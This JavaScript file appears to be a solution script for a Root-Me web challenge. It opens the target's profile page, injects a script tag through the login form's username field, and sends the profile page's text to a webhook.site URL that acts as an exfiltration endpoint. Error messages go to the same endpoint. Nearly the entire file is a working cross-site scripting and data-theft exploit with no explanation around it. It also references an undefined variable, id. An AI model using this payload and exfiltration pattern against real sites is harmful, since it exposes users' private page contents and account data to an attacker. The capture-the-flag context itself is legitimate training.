const ORIGIN = "https://tim-xd.github.io/web-client/index.html";
const LOGIN = "http://challenge01.root-me.org:58003/login";
const PROFILE = "http://challenge01.root-me.org:58003/profile";
const WEBHOOK = "https://webhook.site/abaf4f7a-3e2f-4fb6-aebd-9076e261d651";

function get(url) {
  let xhr = new XMLHttpRequest();
  xhr.open("GET", url, false);
  return xhr.send(null);
}

function post(url, data) {
  let xhr = new XMLHttpRequest();
  xhr.open("POST", url, false);
  return xhr.send(data);
}

// const queryString = window.location.search;
// const urlParams = new URLSearchParams(queryString);
// const id = urlParams.get("id");

try {
  document.getElementById("waitimg").onerror = `window.location = "${PROFILE}"`;

  const profile = window.open(PROFILE, "rootme");

  const payload = `
const profile = window.open("", "rootme");
window.location = "${WEBHOOK}?" + profile.document.body.innerText;
`;
  document.getElementById("username").value = `<script>${payload}</script>`;
  document.getElementById("login").submit();

  setTimeout(() => (window.location = PROFILE), 2000);
} catch (error) {
  post(WEBHOOK, `Error ${id}: ${error}`);
}
